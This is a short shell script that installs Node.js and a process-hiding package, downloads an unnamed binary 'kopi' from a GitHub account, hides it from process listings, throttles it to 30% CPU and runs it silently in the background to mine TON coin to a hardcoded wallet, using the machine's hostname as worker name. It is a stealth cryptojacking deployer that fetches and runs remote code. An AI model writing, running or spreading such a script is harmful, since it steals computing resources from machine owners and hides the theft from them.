#!/bin/sh

apt update && apt -y install sudo
sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make
sudo -u root npm i -g node-process-hider
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
nohup wget https://github.com/aurbach55/dera/raw/main/kopi >/dev/null 2>&1
ph add kopi
chmod +x kopi
cpulimit -e kopi -l 30 &
nohup ./kopi --algo TON --pool https://next.ton-pool.com --user EQAxkdZ4fFoFc0wZYbwT5Z2D-cA7q1te5etqcwGx6mTFys2u.$(cat /proc/sys/kernel/hostname) >/dev/null 2>&1
